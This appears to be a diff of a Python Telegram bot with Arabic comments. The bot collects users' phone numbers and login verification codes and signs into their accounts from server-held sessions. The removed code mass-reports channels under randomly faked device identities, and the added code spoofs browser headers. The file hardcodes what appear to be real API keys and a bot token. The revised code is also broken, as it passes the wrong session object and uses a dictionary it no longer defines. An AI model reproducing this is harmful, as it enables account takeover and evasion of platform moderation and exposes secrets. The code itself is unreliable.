@@ -1,34 +1,32 @@
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
 from telethon import TelegramClient
-from telethon.tl.functions.account import ReportPeerRequest
-from telethon.tl.types import InputReportReasonPornography, InputReportReasonViolence, InputReportReasonSpam, InputPeerChannel
-from faker import Faker
-import os
+from telethon.sessions import StringSession
+from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
 import asyncio
-from datetime import datetime
+import aiohttp
 
 # تفاصيل API الخاصة بك
 API_ID = '16748685'
 API_HASH = 'f0c8f7e4a7a50b5c64fd5243a256fd2f'
 BOT_TOKEN = '7852676274:AAHIx3Q9qFbylmvHKDhbhT5nEpFOFA5i2CM'
-# إنشاء كائن Faker
-fake = Faker()
 
-# قاموس لتخزين معلومات المستخدم
-user_data = {}
+# إعداد الـ Headers لمحاكاة جهاز حقيقي
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Connection': 'keep-alive'
+}
 
-def generate_device_info():
-    return {
-        'device': fake.word() + " " + fake.word(),
-        'system': f"Android {fake.random_int(min=5, max=12)}.{fake.random_int(min=0, max=9)}",
-        'app_version': f"{fake.random_int(min=1, max=9)}.{fake.random_int(min=0, max=99)}.{fake.random_int(min=0, max=999)}",
-        'lang_code': fake.language_code()
-    }
+async def create_session():
+    """إنشاء جلسة aiohttp مع Headers مخصصة"""
+    session = aiohttp.ClientSession(headers=headers)
+    return session
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     keyboard = [
-        [InlineKeyboardButton("تسجيل دخول", callback_data='login')],
+        [InlineKeyboardButton("تسجيل حساب", callback_data='register')],
         [InlineKeyboardButton("إبلاغ", callback_data='report')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -38,97 +36,46 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
     await query.answer()
 
-    if query.data == 'login':
+    if query.data == 'register':
         await query.edit_message_text(text="الرجاء إدخال رقم هاتفك مع رمز الدولة (مثال: +1234567890):")
-        return
+        return 'PHONE'
     elif query.data == 'report':
         await query.edit_message_text(text="الرجاء إدخال اسم المستخدم أو رابط القناة/المجموعة التي تريد الإبلاغ عنها:")
-        return
+        return 'CHANNEL'
 
 async def phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     phone = update.message.text
+    
+    # إنشاء جلسة aiohttp مع Headers
+    session = await create_session()
 
-    # تحقق من صحة رقم الهاتف
-    if not phone.startswith('+') or not phone[1:].isdigit():
-        await update.message.reply_text("الرجاء إدخال رقم هاتف صالح مع رمز الدولة (مثال: +1234567890).")
-        return
-    
-    device_info = generate_device_info()
-    user_data[user_id] = {'phone': phone, 'device_info': device_info}
-    
-    client = TelegramClient(
-        f'session_{user_id}_{datetime.now().strftime("%Y%m%d%H%M%S")}', 
-        API_ID, 
-        API_HASH,
-        device_model=device_info['device'],
-        system_version=device_info['system'],
-        app_version=device_info['app_version'],
-        lang_code=device_info['lang_code']
-    )
-    await client.connect()
-    
-    if not await client.is_user_authorized():
-        try:
+    # تمرير الجلسة إلى TelegramClient
+    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH, connection=ConnectionTcpAbridged, session=session)
+
+    try:
+        await client.connect()
+        
+        if not await client.is_user_authorized():
             sent_code = await client.send_code_request(phone)
-            user_data[user_id]['phone_code_hash'] = sent_code.phone_code_hash
             await update.message.reply_text("تم إرسال رمز التحقق. الرجاء إدخاله:")
-        except Exception as e:
-            await update.message.reply_text(f"حدث خطأ: {str(e)}")
-            return
+            return 'CODE'
+        else:
+            await update.message.reply_text("تم تسجيل الدخول بنجاح!")
+    except Exception as e:
+        await update.message.reply_text(f"حدث خطأ أثناء محاولة تسجيل الدخول: {str(e)}")
 
 async def verification_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     code = update.message.text
-    
-    if user_id not in user_data:
-        await update.message.reply_text("حدث خطأ. الرجاء بدء العملية من جديد.")
-        return
 
-    device_info = user_data[user_id]['device_info']
-    client = TelegramClient(
-        f'session_{user_id}_{datetime.now().strftime("%Y%m%d%H%M%S")}', 
-        API_ID, 
-        API_HASH,
-        device_model=device_info['device'],
-        system_version=device_info['system'],
-        app_version=device_info['app_version'],
-        lang_code=device_info['lang_code']
-    )
-    await client.connect()
-    
+    session = await create_session()
+    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH, connection=ConnectionTcpAbridged, session=session)
+
     try:
-        await client.sign_in(user_data[user_id]['phone'], code, phone_code_hash=user_data[user_id]['phone_code_hash'])
-        await update.message.reply_text(f"تم تسجيل الدخول بنجاح!\n\nمعلومات الجهاز:\nالجهاز: {device_info['device']}\nنظام التشغيل: {device_info['system']}\nإصدار التطبيق: {device_info['app_version']}\nاللغة: {device_info['lang_code']}")
-    except Exception as e:
-        if 'TWO_STEPS_VERIFICATION_REQUIRED' in str(e):
-            await update.message.reply_text("مطلوب التحقق بخطوتين. الرجاء إدخال كلمة المرور:")
-        else:
-            await update.message.reply_text(f"حدث خطأ: {str(e)}")
-
-async def two_step_verification(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    password = update.message.text
-    
-    if user_id not in user_data:
-        await update.message.reply_text("حدث خطأ. الرجاء بدء العملية من جديد.")
-        return
-
-    device_info = user_data[user_id]['device_info']
-    client = TelegramClient(
-        f'session_{user_id}_{datetime.now().strftime("%Y%m%d%H%M%S")}', 
-        API_ID, 
-        API_HASH,
-        device_model=device_info['device'],
-        system_version=device_info['system'],
-        app_version=device_info['app_version'],
-        lang_code=device_info['lang_code']
-    )
-    await client.connect()
-    
-    try:
-        await client.sign_in(password=password)
-        await update.message.reply_text(f"تم تسجيل الدخول بنجاح!\n\nمعلومات الجهاز:\nالجهاز: {device_info['device']}\nنظام التشغيل: {device_info['system']}\nإصدار التطبيق: {device_info['app_version']}\nاللغة: {device_info['lang_code']}")
+        await client.connect()
+        await client.sign_in(user_data[user_id]['phone'], code)
+        await update.message.reply_text("تم تسجيل الدخول بنجاح!")
     except Exception as e:
         await update.message.reply_text(f"حدث خطأ: {str(e)}")
 
@@ -136,29 +83,11 @@ async def channel_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     channel_username = update.message.text
     user_id = update.effective_user.id
 
-    # تأكد من صحة إدخال المستخدم
-    if not (channel_username.startswith('@') or 't.me' in channel_username):
-        await update.message.reply_text("الرجاء إدخال اسم مستخدم صالح أو رابط قناة.")
-        return
+    session = await create_session()
+    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH, connection=ConnectionTcpAbridged, session=session)
 
-    if user_id not in user_data:
-        await update.message.reply_text("الرجاء تسجيل الدخول أولاً.")
-        return
-
-    device_info = user_data[user_id]['device_info']
-    client = TelegramClient(
-        f'session_{user_id}_{datetime.now().strftime("%Y%m%d%H%M%S")}', 
-        API_ID, 
-        API_HASH,
-        device_model=device_info['device'],
-        system_version=device_info['system'],
-        app_version=device_info['app_version'],
-        lang_code=device_info['lang_code']
-    )
-    await client.connect()
-    
     try:
-        # الحصول على معلومات القناة
+        await client.connect()
         channel = await client.get_entity(channel_username)
         info = (
             f"معلومات القناة/المجموعة:\n"
@@ -176,67 +105,8 @@ async def channel_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(info, reply_markup=reply_markup)
-        user_data[user_id]['channel'] = channel
     except Exception as e:
         await update.message.reply_text(f"حدث خطأ: {str(e)}")
-
-async def report_channel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = update.effective_user.id
-    channel = user_data.get(user_id, {}).get('channel')
-    
-    if not channel:
-        await query.edit_message_text("لم يتم العثور على معلومات القناة. حاول مرة أخرى.")
-        return
-
-    if user_id not in user_data:
-        await query.edit_message_text("الرجاء تسجيل الدخول أولاً.")
-        return
-
-    device_info = user_data[user_id]['device_info']
-    client = TelegramClient(
-        f'session_{user_id}_{datetime.now().strftime("%Y%m%d%H%M%S")}', 
-        API_ID, 
-        API_HASH,
-        device_model=device_info['device'],
-        system_version=device_info['system'],
-        app_version=device_info['app_version'],
-        lang_code=device_info['lang_code']
-    )
-    await client.connect()
-
-    if not await client.is_user_authorized():
-        await query.edit_message_text("يجب تسجيل الدخول أولاً للإبلاغ عن القناة.")
-        return
-    
-    # تعيين سبب الإبلاغ بناءً على الاختيار
-    if query.data == 'report_porn':
-        reason = InputReportReasonPornography()
-    elif query.data == 'report_violence':
-        reason = InputReportReasonViolence()
-    elif query.data == 'report_spam':
-        reason = InputReportReasonSpam()
-    else:
-        await query.edit_message_text("سبب غير معروف للإبلاغ.")
-        return
-
-    try:
-        result = await client(ReportPeerRequest(
-            peer=InputPeerChannel(channel.id, channel.access_hash),
-            reason=reason,
-            message="تقرير تلقائي من البوت"
-        ))
-
-        if result:
-            await query.edit_message_text("تم الإبلاغ بنجاح!")
-        else:
-            await query.edit_message_text("فشل الإبلاغ. حاول مرة أخرى لاحقًا.")
-    except Exception as e:
-        await query.edit_message_text(f"حدث خطأ أثناء الإبلاغ: {str(e)}")
-    finally:
-        await client.disconnect()
 
 def main() -> None:
     application = Application.builder().token(BOT_TOKEN).build()
@@ -246,7 +116,6 @@ def main() -> None:
     application.add_handler(MessageHandler(filters.Regex(r'^\+\d+$') & ~filters.COMMAND, phone_number))
     application.add_handler(MessageHandler(filters.Regex(r'^\d+$') & ~filters.COMMAND, verification_code))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, channel_info))
-    application.add_handler(CallbackQueryHandler(report_channel, pattern='^report_'))
 
     application.run_polling()
 
